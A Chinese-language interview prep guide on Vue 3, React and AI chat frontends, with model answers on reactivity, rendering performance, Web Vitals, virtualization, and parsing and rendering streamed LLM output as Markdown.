# 面试 01 · Vue / React / AI 前端交互 > 说明

Vue / React / AI 前端交互

答案默认折叠。先自己答一遍，再点开核对。每题末尾的**追问**是面试官顺着你的答案往下挖的那一层 —— 只答得出主问题、答不出追问，通常判定为「背过，没做过」。

- 🔴 必答 — 答不出直接掉档

- 🟡 加分 — 能拉开差距

- ⚪ 可以坦白不会 — 说清边界比硬编好

# 面试 01 · Vue / React / AI 前端交互 > Vue 3 响应式怎么实现的，ref 和 reactive 怎么选

**机制**：每个响应式属性对应一个 dep（effect 集合）。读取时 `track` 把当前活跃的 effect 记进 dep，写入时 `trigger` 通知这些 effect 重新执行。组件的 render 本身就是一个 effect，所以「读了谁 → 谁变了 → 我重渲」是自动建立的。

 

**Proxy 相比 Vue 2 的 `Object.defineProperty`**：defineProperty 劫持的是「已存在的属性」，必须递归遍历初始化，所以新增/删除属性不触发（要 `$set`/`$delete`），数组索引赋值和改 `length` 也不触发（Vue 2 靠重写数组 7 个方法打补丁）。Proxy 劫持的是「对对象的操作」——get / set / has / deleteProperty / ownKeys，上面这些天然支持。代价：不支持 IE11；Map/Set 的方法调用不走属性访问，需要单独的 collectionHandlers。

 

**ref vs reactive**：

 

- `reactive` 只能包对象——基本类型没有属性可以拦截。
- `ref` 用一个 `{ value }` 容器，在 getter/setter 里做 track/trigger，所以基本类型也能响应；模板里顶层 ref 自动解包。
- 实践上默认用 `ref`：心智统一（全都 `.value`），而且可以整体替换（`list.value = newArr`）。`reactive` 对象整体赋值会丢掉原来的代理引用。`reactive` 只留给一组强关联、总是一起用的状态。

 

**必须说出来的三个坑**：

 

1. 解构 `reactive` 丢响应性——拿到的是普通值快照，要用 `toRefs` / `toRef`。
2. Proxy 和原对象 `!==`。`===` 比较、`instanceof`、拿对象当 Map 的 key，都会出问题。
3. 大对象和第三方实例不要深代理。ECharts 实例、地图对象、几 MB 的 JSON，用 `shallowRef` / `shallowReactive` / `markRaw`，否则初始化时递归建代理能卡出可见掉帧。

 

**追问「`reactive` 的数组里 `arr[10] = x`、`arr.length = 0`，Vue 3 生效吗，Vue 2 为什么不行」**：Vue 3 生效，Proxy 拦截的就是索引 set 和 length set 这两个操作本身。Vue 2 不行，因为 defineProperty 只给「初始化时已存在的 key」装了 getter/setter，索引写入和改 length 根本不经过它——这才是 `Vue.set` 和数组方法补丁存在的原因，也是 Vue 3 里 `Vue.set` 被删掉的原因。

# 面试 01 · Vue / React / AI 前端交互 > computed / watch / watchEffect 怎么选

**computed** 声明「派生值」，有缓存且惰性。内部是带 dirty 标记的 effect：依赖变化只把 dirty 置 true 并通知订阅者，真正重算发生在下一次读 `.value`——所以没人用的 computed 根本不会算。3.4+ 改成基于版本号的懒失效，且计算结果没变时不再向下传播。不要在里面写副作用：你无法保证它何时执行、甚至是否执行。

 

**watch** 是命令式的，响应「变化」这件事本身，给你 old/new，要显式声明源，支持 `immediate` / `deep` / `once` / `flush`。

 

**watchEffect** 自动收集依赖（执行体里读到的都算），立即跑一次，没有 old value。方便，但两个陷阱：容易多收依赖；条件分支短路时没读到的依赖不会被追踪，之后它变了不触发。

 

**flush 时机**：默认 `'pre'`（组件更新前），此时读 DOM 拿到的是旧的；要读写 DOM 用 `'post'`；`'sync'` 慎用，一帧内可能触发多次。

 

**判断标准**：能写成 computed 就别用 watch。需要 watch 的信号只有几个——发异步请求、操作 DOM、埋点日志、需要 old value 做 diff。

 

**追问「`watch` 一个 reactive 对象不加 deep 也能触发，但 `watch(() => obj.a.b, ...)` 就要加 deep，为什么」**：源是 reactive 对象时 Vue 内部隐式 traverse（等价于 deep）；源是 getter 时只追踪 getter 里实际读到的路径，返回值是对象的话其内部属性变化不触发，得加 `deep` 或直接返回具体值。顺带说这个真实会咬人的点：**deep watch 的 `oldValue` 和 `newValue` 是同一个引用**，想 diff 必须自己在回调外留一份深拷贝。

# 面试 01 · Vue / React / AI 前端交互 > Vue 的编译时优化做了什么

Vue 是「组件级响应 + 编译时静态分析」两层叠加：

 

第一层，响应式让更新从**依赖这个数据的那个组件**开始重渲，而不像 React 默认从触发点自顶向下重渲整棵子树。

 

第二层，编译器把 patch 范围继续压小：

 

- **PatchFlag** —— 模板编译时标注动态部分（TEXT / CLASS / STYLE / PROPS / FULL\_PROPS），运行时只比对标了 flag 的部分，静态属性完全跳过。
- **静态提升** —— 纯静态 vnode 提到 render 函数外，只创建一次；连续静态节点多时直接 `createStaticVNode` 走 innerHTML。
- **Block / dynamicChildren** —— 一个 block 把子树里所有动态节点收集进一个扁平数组，diff 时不递归整棵树，线性遍历这个数组。复杂度从「树的规模」降到「动态节点的数量」。`v-if` / `v-for` 会切分出新的 block，因为它们的结构不稳定。
- **cacheHandlers** —— 内联事件处理函数缓存，避免每次 render 生成新函数、导致 props 被判定为变化。

 

**边界（说出来就明显不是背的）**：这些优化只对**模板**生效。手写 `render` 函数或 JSX 拿不到 PatchFlag，退化成全量 diff。

 

**追问「`v-for` 用 index 当 key，只是性能问题吗」**：不是，是**正确性**问题。中间插入或删除时，index key 让框架认为「还是同一个节点，只是内容变了」而不是「插入/删除了节点」，于是复用已有组件实例和 DOM——所有没同步进数据的状态都会错位到别的行：input 里未提交的值、checkbox 勾选、焦点、滚动位置、CSS 过渡动画、子组件内部 state。用稳定业务 id；后端没给就在数据入口生成一次并持久化，绝不能在 render 里生成。

# 面试 01 · Vue / React / AI 前端交互 > 改了状态 DOM 不立刻更新，异步更新队列怎么跑的

`trigger` 并不直接渲染，而是把组件的更新 job 推进队列（去重 + 按组件 uid 从父到子排序），在同一个 **microtask**（`Promise.then`）里 flush。所以一个 tick 内改 100 次状态只渲染一次。

 

队列分三段执行：**pre**（`flush: 'pre'` 的 watch 回调）→ **组件更新** → **post**（`flush: 'post'` 的 watch、模板 ref 赋值完成、transition 钩子）。父子顺序保证父先更新；子组件如果已经被父带着重渲了，它自己的 job 会被跳过。

 

**实践含义**：任何要读真实 DOM 的操作——测高度、滚到底部、focus、初始化第三方库——必须在 `await nextTick()` 之后，或者放进 `watch(..., { flush: 'post' })` / `onUpdated`。流式输出里的「自动滚到底」就是天天踩这个的地方。

 

**对比 React**：React 18 之前只在 React 事件处理函数里批处理（`setTimeout`、Promise、原生事件监听里都不批），18 起 automatic batching 覆盖所有场景。React 想同步刷新有 `flushSync`，Vue 没有直接等价物——Vue 的方向相反，是 `await nextTick()` 等它自然刷完。

 

**追问「`nextTick` 的回调一定在 DOM 更新之后吗」**：只保证在**当前已入队**的更新 flush 之后。如果在 nextTick 回调里又改了状态，那属于新一轮，后面还有更新。想稳定拿到某个元素的最新尺寸，`flush: 'post'` 的 watch 或 `onUpdated` 比 nextTick 更可靠；如果尺寸变化来自图片或字体加载，那要靠 `ResizeObserver`，任何 tick 都救不了。

# 面试 01 · Vue / React / AI 前端交互 > 什么状态该放 Pinia，SSR 下有什么坑

**Pinia vs Vuex**：去掉了 mutation（action 里直接改），TS 推导好，store 扁平、可互相 import、天然 code-split。本质上 `defineStore` 就是「一个用 ref/computed 组织的 composable，挂到 app 级实例上」。

 

**该进 store**：跨路由跨组件共享，且生命周期长于任何单个组件——用户信息、权限、主题、会话列表。

 

**不该进 store**：

 

- 表单临时值、只在父子两级流动的状态（props / emit 就够）。
- **服务端数据缓存**。这该交给 TanStack Query / `useAsyncData` 这类方案：带 key、staleTime、并发去重、失效重取。自己在 store 里手写 `list / loading / error` 三件套，等于重新实现半个缓存库，而且几乎一定会漏掉竞态和失效。

 

**SSR 的致命坑**：模块级单例在 Node 进程里被**所有请求共享**——用户 A 的数据会泄漏给用户 B。所以 SSR 必须每个请求 `createApp` + `createPinia`；不要在模块顶层初始化任何带用户态的东西，包括带 token 的 axios 实例。另一类是 hydration mismatch：服务端把状态序列化进 `__INITIAL_STATE__`，客户端接管前不能读 `window` / `localStorage`，否则两端渲染结果不一致。

 

**追问「那登录态你放哪」**：首选 **HttpOnly + Secure + SameSite 的 cookie**，前端根本不接触 token，再配 CSRF 防护（SameSite=Lax/Strict，或 double-submit token）。放 localStorage 的 access token 一旦有 XSS 就直接被偷走，而 AI 应用要渲染模型输出的富文本，XSS 面比普通后台大得多。必须用 token 的场景（跨域、移动端 webview）：access token 只放内存，refresh token 放 HttpOnly cookie，并接受「刷新页面要静默续期」的复杂度。

 

---

 

## React

# 面试 01 · Vue / React / AI 前端交互 > useEffect 的依赖、清理函数、以及为什么会执行两次

**心智模型**：useEffect 不是「生命周期钩子」，是「把组件状态同步到外部系统」。判断要不要用它的标准是：这件事有没有涉及 React 之外的东西（DOM API、订阅、定时器、网络、第三方库）。纯粹的数据派生不该用 effect，应该在渲染时直接算。

 

**依赖数组**：React 用 `Object.is` 逐项浅比较。所以内联对象、数组、函数每次渲染都是新引用，会让 effect 每次都跑。修法有三种，按优先级排：把值挪进 effect 内部（最好）、`useMemo`/`useCallback` 稳定引用、把依赖降维成基本类型（`obj.id` 而不是 `obj`）。

 

绝对不要用 lint 的 `eslint-disable` 去糊依赖警告。依赖数组不是「什么时候重跑」的配置项，是「这个 effect 读了哪些外部值」的事实声明；骗它就是制造 stale closure。

 

**清理函数**：effect 返回的函数在「下次执行前」和「卸载时」都会调用。凡是建立了持续关系的都必须清理——订阅、`addEventListener`、`setInterval`、WebSocket、`AbortController`、ResizeObserver。不清理的典型后果不是内存泄漏那么抽象，是**在已卸载组件上 setState、以及同一个监听器被叠加注册 N 次**。

 

**为什么开发环境执行两次**：StrictMode 在开发模式下故意 mount → unmount → mount 一遍，用来暴露「没写清理函数」的 effect。它是探测器不是 bug。正确反应是让 effect 变得幂等可重入，而不是关掉 StrictMode 或者加 `useRef` 挡第二次执行。生产构建不会双执行。

 

**追问「这个 effect 里我只想用某个值，但不想让它变化时重跑，怎么办」**：用 **`useEffectEvent`**（React 19.2 起稳定，2023 年起以 `useEvent` 名义实验了两年）。它把「响应式依赖」和「只读最新值」分开：包在里面的函数总能读到最新的 props/state，但**不算依赖**、不进依赖数组。典型场景就是 effect 内部触发的回调——订阅事件、定时器、WebSocket 消息处理。用它要升级 `eslint-plugin-react-hooks` 到最新版，否则 lint 还会要求你把它塞进依赖；另外它只能声明在与该 effect 同一个组件或 hook 里。

 

要强调的一点：**它不是用来消 lint 警告的**。老代码里那种 ref latest 模式（用 ref 存最新值、effect 里读 `ref.current`、ref 不进依赖）是 19.2 之前的替代方案，能用但绕过了响应式，只适合埋点、日志、回调透传这类不需要因值变化重建关系的场景。判断标准始终是：这个值变了，effect 需不需要重新建立关系？需要就该进依赖，不需要才用 Effect Event。

# 面试 01 · Vue / React / AI 前端交互 > 为什么会拿到旧的 state，怎么修

**根因**：每次渲染是一次独立的函数执行，`state` 是那次执行里的**常量**。effect、事件回调、定时器捕获的是它们被创建时那一次渲染的闭包。所以「旧 state」不是 bug，是闭包的正常行为——React 只是让这个特性变得容易踩。

 

三个典型现场：

 

```jsx
// 1. setInterval 永远看到 count = 0
useEffect(() => {
  const id = setInterval(() => setCount(count + 1), 1000)
  return () => clearInterval(id)
}, [])                              // 空依赖 → 闭包锁死在首次渲染
// 修：setCount(c => c + 1)，用更新函数拿最新值

// 2. 同一个事件里连续调用
setCount(count + 1)
setCount(count + 1)                 // 结果 +1，不是 +2
setCount(c => c + 1)                // 用函数式更新才会累加
setCount(c => c + 1)

// 3. 异步回调里读 state
const onSend = async () => {
  await post(text)
  console.log(text)                 // 是点击那一刻的 text，不是现在输入框里的
}
```

 

**修法优先级**：

 

1. 更新依赖当前值 → 用**函数式更新** `setX(prev => ...)`。这是绝大多数场景的答案。
2. 多个状态互相耦合 → 合并成 `useReducer`，把「怎么变」集中到 reducer 里，回调里只 dispatch 意图。
3. 确实需要读「当前最新值」且不想触发重渲 → ref。但 ref 的变化不会触发渲染，所以它只适合不参与渲染的值。

 

**必须说清的一点**：state 是「渲染的输入」，ref 是「渲染之外的可变盒子」。把该渲染的值放 ref 里，界面就不会更新；把不该渲染的值放 state 里，就会产生无意义的重渲。选错这个是 React 代码变乱的常见起点。

 

**追问「React 18 的 automatic batching 之后，`setState` 后立刻读 state 能读到新值吗」**：不能，任何时候都不能。批处理只影响「渲染合并几次」，不影响「当前这次渲染里 state 是常量」这个事实。要基于新值做事，就在下一次渲染或 effect 里做。`flushSync` 能强制同步刷新 DOM，但它破坏批处理、有性能代价，只在必须立刻测量 DOM 的场景用。

# 面试 01 · Vue / React / AI 前端交互 > 重渲染是怎么触发的，memo 三兄弟什么时候真有用

**触发条件只有三个**：自身 state 变化、订阅的 context value 变化、父组件重渲染（无条件带上所有子组件，不管 props 有没有变）。第三条是最反直觉的：**props 没变，子组件默认也会重渲**。React 的默认策略是「重跑 render 函数，再 diff vnode」，因为跑一遍函数通常比精确追踪依赖更便宜。

 

`React.memo` 就是给第三条装一个浅比较闸门；`useMemo` 缓存值；`useCallback` 缓存函数引用（本质是 `useMemo(() => fn, deps)`）。

 

**为什么大部分 memo 是无效劳动**：

 

- `memo` 的子组件收到内联对象、数组、函数、或 `<Child>{children}</Child>` 这种 JSX，浅比较必然失败，memo 白加还多一次比较开销。
- `useCallback` 包了一个传给普通（非 memo）子组件的函数：子组件反正会重渲，纯浪费。
- 依赖数组本身写错，memo 每次都失效。

 

**真正值得 memo 的地方**：单次计算确实昂贵（大数组排序过滤、复杂正则、`JSON.parse` 大对象）；把稳定引用喂给 `memo` 子组件或 effect 依赖；列表里成百上千个 item 组件。

 

**优先用结构性优化，而不是撒 memo**：

 

1. **状态下移** —— 把频繁变化的 state 推到真正需要它的叶子组件，别放在树顶。这一条通常比所有 memo 加起来有效。
2. **内容提升 / children 透传** —— 不变的子树作为 `children` 传入，父组件重渲时这段 JSX 引用不变，不会重渲。
3. **拆分 context** —— 一个大 context 里任何字段变化都会唤醒所有消费者。按变化频率拆成多个 context，或者上 zustand / jotai 这类支持选择器订阅的方案。

 

**追问「React Compiler 出来之后还需要手写 memo 吗」**：编译器 2025 年 10 月发布 1.0 稳定版（Meta 内部已大规模生产使用，支持 React 17+，Next.js 16 里标为 stable 但默认不开），它会自动插入等价的记忆化，而且能覆盖手写 `useMemo` / `useCallback` 做不到的条件分支路径——目标就是让手写 memo 变成不必要。但两点必须说清：

 

第一，它优化的是重渲染开销，**不会替你修好状态放错位置、context 设计过粗、effect 里做重活这些结构性问题**。

 

第二，它依赖代码遵守 Rules of React（不在渲染中改外部变量、不在渲染中产生副作用）。破坏规则的文件编译器会跳过，所以落地路径是先上 `eslint-plugin-react-hooks` v6+（原独立的 `eslint-plugin-react-compiler` 已并入），把 `unsupported-syntax` 这类规则从 warn 提到 error，看清哪些文件被静默跳过了，修完再开编译器。

 

所以「先把结构和规则做对」始终优先于任何自动或手动的记忆化。

# 面试 01 · Vue / React / AI 前端交互 > 并发渲染到底解决了什么问题

**要解决的问题**：React 18 之前渲染是同步不可中断的，一旦开始就必须走完整棵树。渲染大列表时主线程被占死，用户输入没有响应——输入框卡顿、点击没反馈。

 

**并发渲染的核心能力是「渲染可中断、可丢弃、有优先级」**：高优先级更新（用户输入）可以打断正在进行的低优先级渲染，低优先级渲染的中间结果被丢掉后重来。注意它不是多线程，仍然是单线程时间切片。

 

三个能用上的 API：

 

- **`useTransition`** —— 把更新标记为「可被打断的非紧急更新」，同时给你 `isPending` 用来做视觉反馈。经典场景：搜索框输入即时响应，结果列表的重渲染让它慢慢来。
- **`useDeferredValue`** —— 传一个值，拿到一个「滞后版本」。用它渲染重组件，输入框绑原值。比手写 debounce 好的地方是它自适应：设备快就几乎不滞后，设备慢才拉开，而不是固定 300ms。
- **`Suspense`** —— 声明式的加载边界，配合 `use` / RSC / 支持 suspense 的数据层，把 loading 状态从组件内部的 `if (loading)` 挪到边界上。

 

**要划清的边界（这题最容易吹过头）**：并发渲染优化的是**响应性**，不是总计算量。React 仍然单线程，长任务该拆的还得拆。如果卡顿来自真实的 CPU 重活（几千个节点的布局、大 JSON 解析），正确解法是虚拟化、Web Worker、服务端预处理——`useDeferredValue` 只是让卡顿发生在「不阻塞输入」的时机，不会让它消失。

 

**追问「`useDeferredValue` 和 debounce 有什么区别」**：debounce 是固定时间窗口，不管设备快慢都要等满；deferred value 由调度器决定，主线程空就立刻更新，忙才滞后，而且可以被更高优先级更新打断。另一个实际差别：debounce 会延迟**请求的发出**（适合减少网络调用），deferred value 只延迟**渲染**（请求该发还是发）。两个可以叠加用：debounce 控请求频率，deferred 控渲染优先级。

# 面试 01 · Vue / React / AI 前端交互 > 用 useEffect 拉数据有什么问题

`useEffect` + `fetch` + `useState` 这个组合会漏掉一堆东西，而且每一条都是线上真实 bug：

 

1. **竞态**。快速切换参数时请求 A 后发但先返回，被 B 的结果覆盖，界面显示的是过期数据。修：`AbortController` 在清理函数里 abort，或者用「只接受最后一次请求」的标记位。
2. **瀑布流**。父组件 effect 拉完数据才渲染子组件，子组件才开始它的 effect 拉自己的数据。串行链路，首屏被拉长成 N 个 RTT。
3. **没有缓存**。返回上一页重新拉一遍，同一份数据不同组件各拉一次。
4. **StrictMode 双执行暴露的重复请求**，没做幂等和取消就会打两次。
5. **loading / error / empty / stale 状态全靠手写**，每个组件重写一遍，写法还不一致。
6. **没有失效和重取机制**——窗口重新聚焦、网络恢复、轮询、mutation 之后刷新，全都要自己实现。

 

**正确答案是不要自己写**。React 官方文档就明确建议用框架或数据层：TanStack Query / SWR（客户端），或者 RSC / loader（Next.js、Remix、Nuxt）。它们把上面 6 条都处理掉，并给你 `staleTime` / `gcTime` / 请求去重 / 乐观更新 / 依赖查询这些东西。

 

**在 AI 应用里这条更关键**：流式接口没法套进普通的 query 缓存模型（一个响应是逐段到达的 token 流），所以实践上是分层的——会话列表、历史消息、配置这类走查询库；正在流的那条消息走单独的流式状态管理，流结束后再写回缓存（TanStack Query 里就是 `setQueryData` 手动落盘）。能讲清这个分层，说明你真做过 AI 前端而不只是读过文档。

 

**追问「那 Server Components 是不是就不需要客户端数据层了」**：不是替代关系。RSC 擅长「首屏、静态、SEO 相关、可以在服务端一次组装完的数据」，省掉 waterfall 和客户端 bundle。但交互态数据仍然需要客户端缓存：乐观更新、轮询、无限滚动、跨组件共享的可变数据、离线。实际项目通常混用——RSC 拉首屏，客户端库管交互，两边通过 hydrate 初始数据衔接。

 

---

 

## 通用工程

# 面试 01 · Vue / React / AI 前端交互 > Core Web Vitals 怎么定位和优化

三个指标，各自对应完全不同的问题：

 

**LCP（Largest Contentful Paint，最大内容绘制）** 好的阈值 ≤ 2.5s。拆开看四段：TTFB、资源加载延迟、资源加载时长、渲染延迟。定位就是看这四段哪段长。常见解法——首屏图用 `<img>` 而不是 CSS 背景（能被 preload scanner 发现）、`fetchpriority="high"` + `preload`、首屏图**不要** `loading="lazy"`、字体用 `font-display: swap` 且 preload、消除渲染阻塞的 CSS/JS、CDN + 缓存降 TTFB。

 

**INP（Interaction to Next Paint，交互到下次绘制）** 好的阈值 ≤ 200ms，2024 年 3 月替代了 FID。它测的是**整个交互链路**：输入延迟 + 事件处理 + 渲染下一帧。FID 只测第一段，所以以前 FID 全绿但用户还是觉得卡的情况很常见。优化手段：拆长任务（`scheduler.yield()`，或 `await new Promise(r => setTimeout(r, 0))` 让出主线程）、把非紧急工作推后（`requestIdleCallback` / `startTransition`）、重计算搬进 Web Worker、减少事件处理里的同步 DOM 读写（避免布局抖动）、长列表虚拟化。

 

**CLS（Cumulative Layout Shift，累积布局偏移）** 好的阈值 ≤ 0.1。原因基本就那几个：图片/视频没写宽高（写 `width`/`height` 属性或 `aspect-ratio`）、动态插入的横幅广告没预留空间、字体切换导致的重排（`size-adjust`、`font-display: optional`）、用 `top`/`height` 做动画而不是 `transform`。

 

**定位工具的分工要说清**：Lighthouse 是实验室数据，单次、固定网络、无真实用户交互——它测不出真实 INP。真实用户数据看 CrUX / `web-vitals` 库自己上报的 RUM，看 **p75**。两者不一致时以 RUM 为准，实验室数据只用来复现和调试。

 

**追问「AI 聊天类页面的 CWV 有什么特别的地方」**：三点很不一样。① LCP 的定义很尴尬——首屏往往是空对话框，真正的内容在流式输出里，所以要看的是**TTFT（首 token 时间）**这个业务指标，而不只是 LCP。② INP 在流式输出期间最容易崩：每来一个 token 就重渲染整个 Markdown 树，用户此时想点「停止」或者滚动就会卡；这是第 14 题的核心问题。③ CLS 在流式输出时是**持续发生**的——内容不断长出来。区分是必要的（内容增长）还是有害的（代码块高亮完成后重排、图片加载后跳动）；有害的那部分靠预留空间和稳定容器修掉。

# 面试 01 · Vue / React / AI 前端交互 > 长列表虚拟化，动态高度怎么处理

**原理**：只渲染可视区 + 上下 overscan 的那几十个 item，用一个撑起总高度的占位容器保持滚动条正确，通过 `transform: translateY` 定位可视窗口。DOM 节点数从 N 降到常数。

 

**定高最简单**：`index * itemHeight` 直接算，二分查找定位起始 index，O(1) 定位。

 

**动态高度（聊天消息、富文本卡片就是这种）** 是真正的难点，做法是「估算 + 测量 + 修正」：

 

1. 每个 item 先用估算高度占位。
2. 渲染后用 `ResizeObserver` 测真实高度，写进一个 index → height 的缓存。
3. 更新累积偏移量。用前缀和数组的话，改一个 item 的高度要 O(N) 重算后面所有偏移；数据量大就换成**线段树/树状数组**，单点更新 O(log N)。
4. 测量结果与估算不同时会导致**滚动位置跳动**——必须在同一帧里把 `scrollTop` 补偿回去，否则用户会看到内容抖。

 

**倒序列表（聊天）的额外麻烦**：新消息在底部、历史在顶部。往上加载历史会把当前内容往下推，所以要「锚定」：记录一个参照 item 的 id 和它相对视口的偏移，插入后按这个参照把 `scrollTop` 修正回去。CSS 的 `overflow-anchor: auto` 有时能帮上，但跨浏览器不可靠，关键路径要自己补偿。

 

**不要自己写**。`@tanstack/virtual`（框架无关）、`react-virtuoso`（动态高度和聊天场景开箱好用）、`vue-virtual-scroller`。自己写必踩的坑：Safari 的橡皮筋滚动、`scrollTop` 亚像素误差、图片加载后高度变化、`position: sticky` 表头、键盘导航和 `aria-rowcount` 这类无障碍属性、Ctrl+F 搜不到未渲染的内容。

 

**追问「虚拟化后无障碍和搜索怎么办」**：这是虚拟化的固有代价，必须承认而不是假装没有。缓解手段：容器用 `role="list"` / `aria-setsize` / `aria-posinset` 告诉屏幕阅读器真实总数和当前位置，让虚拟化对辅助技术透明；键盘焦点移出可视区时要主动滚动并保证目标 item 已渲染（焦点落在被回收的节点上会丢焦点）；页面内搜索确实搜不到未渲染内容，正确做法是提供应用内搜索接口，让搜索走数据层而不是靠浏览器搜 DOM。**打印、导出、SEO 场景要单独走非虚拟化的渲染路径。**

 

---

 

## AI 前端交互

 

这一节是你的差异化优势区。答案里的每个数字都建议换成你自己项目里的真实值。

# 面试 01 · Vue / React / AI 前端交互 > 流式输出前端怎么接，SSE / fetch 流 / WebSocket 怎么选

**三种方案的取舍**：

 

|  | EventSource (SSE) | fetch + ReadableStream | WebSocket |
| --- | --- | --- | --- |
| 方向 | 单向下行 | 单向下行 | 双向 |
| 请求方法 | 只能 GET | 任意，可带 body | — |
| 自定义 header | **不行**（带不了 Authorization） | 可以 | 握手时受限 |
| 自动重连 | 浏览器内建 + `Last-Event-ID` | 自己写 | 自己写 |
| 中断 | `close()` | `AbortController` | `close()` |
| HTTP/2 多路复用 | 支持 | 支持 | 不复用（独立连接） |
| 代理/网关兼容 | 好，但要防缓冲 | 好 | 有些企业代理会掐 |

 

**实际选择**：LLM 对话场景绝大多数用 **fetch + ReadableStream**（OpenAI SDK 也是这条路），因为要 POST 带长 prompt、要自定义 Authorization header、要精确 abort。`EventSource` 只能 GET 且不能带 header 这两条基本判了死刑。WebSocket 只在真需要双向（实时语音、协同编辑、服务端主动推多路事件）时用。

 

**解析要点**（这是最容易写错的地方）：

 

```js
const res = await fetch(url, { method: 'POST', body, signal: ctrl.signal })
if (!res.ok || !res.body) throw new Error(`HTTP ${res.status}`)

const reader = res.body.pipeThrough(new TextDecoderStream()).getReader()
let buf = ''
while (true) {
  const { done, value } = await reader.read()
  if (done) break
  buf += value
  // 必须按 \n\n 切分事件，且保留最后一个不完整的片段
  const events = buf.split('\n\n')
  buf = events.pop() ?? ''
  for (const evt of events) {
    for (const line of evt.split('\n')) {
      if (!line.startsWith('data:')) continue      // 跳过 event: / id: / : 注释(心跳)
      const data = line.slice(5).trim()
      if (data === '[DONE]') return
      handleDelta(JSON.parse(data))
    }
  }
}
```

 

四个必须提到的坑：

 

1. **不能假设一个 chunk 就是一个完整事件**。TCP 分片会把一个 JSON 切成两半，必须用缓冲区攒到 `\n\n` 再解析。这是 90% 的「偶发 JSON parse 错误」的来源。
2. **多字节字符会被切断**。中文 UTF-8 是 3 字节，直接 `new TextDecoder().decode(chunk)` 会产生乱码「�」。必须用 `TextDecoderStream`，或 `decode(chunk, { stream: true })`。
3. **HTTP 200 不代表成功**。流中途可以推一个 error 事件，或者直接断开。要处理「已经吐了一半然后失败」的状态。
4. **代理缓冲**。nginx 要 `proxy_buffering off` + `X-Accel-Buffering: no`，否则响应被攒够一批才下发，TTFT 直接变成总时长，看起来像「流式没生效」。

 

**追问「怎么判断是模型慢还是网络/网关的问题」**：分段埋点。客户端记 `请求发出 → 首字节到达（TTFT）→ 每个 chunk 的到达间隔 → 结束`；服务端记 `收到请求 → 调用上游 → 上游首 token → 转发完成`。对比两边的 TTFT 就能定位：服务端 TTFT 小而客户端 TTFT 大 = 网关缓冲或网络问题；两边都大 = 模型或 prompt 太长（也可能是 RAG 检索阶段耗时，所以检索要单独计时）。chunk 间隔突然出现规律性的大间隙，通常是缓冲；随机大间隙通常是上游限流或负载。**没有分段埋点就只能猜，这一点本身就是答案。**

# 面试 01 · Vue / React / AI 前端交互 > 流式 Markdown 渲染的闪烁和性能问题怎么解

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q14

**问题的本质**：token 是流式到达的，但 Markdown 的语法**跨 token**。语法结构未闭合时解析结果会剧烈跳变。

# 面试 01 · Vue / React / AI 前端交互 > 流式 Markdown 渲染的闪烁和性能问题怎么解

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q14

具体表现：三个反引号的围栏刚吐出来、还没有语言标识和内容时，先渲染成一个空代码块又立刻重排；`**加粗` 只出现前半边，被渲染成字面星号，闭合后又变成加粗；表格逐行到达，每来一行整个表格结构重算、列宽跳变；有序列表和引用块同理。视觉上就是持续闪烁 + 布局抖动。

# 面试 01 · Vue / React / AI 前端交互 > 流式 Markdown 渲染的闪烁和性能问题怎么解

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q14

**四层解法，按性价比排**：

# 面试 01 · Vue / React / AI 前端交互 > 流式 Markdown 渲染的闪烁和性能问题怎么解

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q14（连续片段 1/2，需结合相邻段阅读）

前文：**四层解法，按性价比排**：

1. **别每个 token 都重渲**。按帧合并：用 `requestAnimationFrame` 或 ~50ms 的节流，把这期间到达的 token 一次性 append。60fps 已经远超人眼对文字增长的感知，而重渲次数降一个数量级。这一条通常就解决了大部分 INP 问题。
2. **只重渲最后一段**。把已完成的 Markdown 块（blocks）和「正在生长的最后一块」分开：前面的块 memo 掉、永不重渲；只有最后一块每帧重解析。要求解析器能按 block 增量输出——`streaming-markdown` / `marked` 的 lexer 都能做到；React 侧还要给每个 block 稳定的 key。
3. **未闭合结构的处理策略**。检测到未闭合的代码块/加粗/行内代码，两种做法：一是先按纯文本渲染，闭合后再升级为富文本（简单、但升级瞬间有一次跳变）；二是**投机闭合**——解析前临时补上闭合符号，让它渲染成正确的富文本结构，下一帧再用真实内容替换。第二种视觉更平滑，Vercel 的 `streamdown` 和 ChatGPT 的实现都是这个思路。代码块要给容器一个 `min-height` 防止塌陷。

# 面试 01 · Vue / React / AI 前端交互 > 流式 Markdown 渲染的闪烁和性能问题怎么解

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q14（连续片段 2/2，需结合相邻段阅读）

前文：**四层解法，按性价比排**：

4. **语法高亮延后**。Shiki / highlight.js 对一个正在生长的代码块每帧高亮一次，是最典型的性能杀手。流式期间用等宽纯文本 + 固定容器，**流结束后再做一次高亮**。必须流式高亮的话，搬进 Web Worker。

# 面试 01 · Vue / React / AI 前端交互 > 流式 Markdown 渲染的闪烁和性能问题怎么解

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q14

**别忘了**：内容增长时容器高度必须让浏览器自然处理，不要在 JS 里算高度再设死；`content-visibility: auto` 对长对话的滚动性能帮助明显；已折叠的历史消息不必保持渲染。

# 面试 01 · Vue / React / AI 前端交互 > 流式 Markdown 渲染的闪烁和性能问题怎么解

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q14

**追问「为什么不干脆等流结束再渲染 Markdown」**：因为流式的全部价值就是让用户尽早开始读——TTFT 和感知等待时间是这类产品的核心体验指标，等到结束再渲染等于把流式退化成一次性响应，用户看着 loading 转好几秒。真正的取舍不在「渲不渲」，而在**渲染频率**和**渲染粒度**：帧节流 + block 级增量 + 高亮延后，三样加起来既保住了即时感又控住了开销。如果面试官追问极端情况（超长表格、大段 LaTeX），可以补一句：对这类局部结构可以单独降级成「流式期间显示占位骨架，结束后一次性渲染」，因为它们本来就不适合逐字阅读。

# 面试 01 · Vue / React / AI 前端交互 > 自动滚到底和用户手动上滑怎么共存

**需求冲突**：流式输出时内容不断长出，默认要跟着滚到底；但用户往上翻看历史时，不能被强行拽回底部——这是聊天类产品最招人烦的 bug 之一。

 

**做法**：维护一个 `isPinnedToBottom` 状态，只有它为 true 时才自动滚。

 

- **判定「在底部」要留容差**：`scrollHeight - scrollTop - clientHeight < 32`。不留容差在高 DPI 缩放下会因为亚像素误差永远判不到底。
